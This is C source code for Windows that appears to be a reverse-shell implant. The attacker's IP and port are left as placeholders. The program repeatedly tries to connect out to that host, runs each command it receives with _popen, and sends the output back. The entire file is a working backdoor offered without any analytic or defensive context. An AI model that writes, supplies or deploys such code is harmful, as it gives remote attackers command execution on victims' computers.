#include <stdio.h>
#include <winsock2.h>
#include <windows.h> // -lws2_32

WSADATA wsaData;
SOCKET winSock;
struct sockaddr_in sockAddr;

int port = PORT_HERE;
char *ip = "IP_HERE";

int main(void) {
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(ip);

    int retCode;
    do {
        retCode = WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);
        printf("%i\n", retCode);
        if (retCode != 0) {
            Sleep(5000);
        }
    } while (retCode != 0);

    char buffer[4096];
    int bytesReceived;
    do {
        bytesReceived = recv(winSock, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';

            char command[4096];
            snprintf(command, sizeof(command), "%s", buffer);
            FILE *fp = _popen(command, "r");
            if (fp != NULL) {
                char output[4096];
                size_t bytesRead = fread(output, 1, sizeof(output) - 1, fp);
                output[bytesRead] = '\0';
                _pclose(fp);

                send(winSock, output, strlen(output), 0);
            }
        }
    } while (bytesReceived > 0);

    closesocket(winSock);
    WSACleanup();
    return 0;
}